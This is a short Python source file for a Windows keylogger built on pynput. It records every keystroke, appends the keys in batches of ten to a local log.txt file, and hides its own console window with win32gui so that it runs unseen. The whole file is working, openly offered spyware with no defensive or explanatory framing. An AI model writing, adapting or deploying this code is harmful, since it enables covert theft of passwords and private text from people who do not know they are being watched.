# before execution
    # pip install pynput
    # pip install pywin32
import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k == "Key.space":
                f.write(' ')
            elif k == "Key.backspace":
                f.write("<backspace>")
            elif k == "Key.caps_lock":
                f.write("<cap>")
            elif k == "Key.enter":
                f.write("<enter>")
            elif k == "Key.ctrl_l":
                f.write("<ctrl>")
            elif k == "Key.shift":
                f.write("<shift>")
            elif k == "Key.tab":
                f.write("<tab>")
            else:
                f.write(str(k))

def on_release(key):
    if key == Key.esc:
        return False
        
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

with Listener(on_press=on_press, on_release=on_release) as listener:
    hide()
    listener.join()



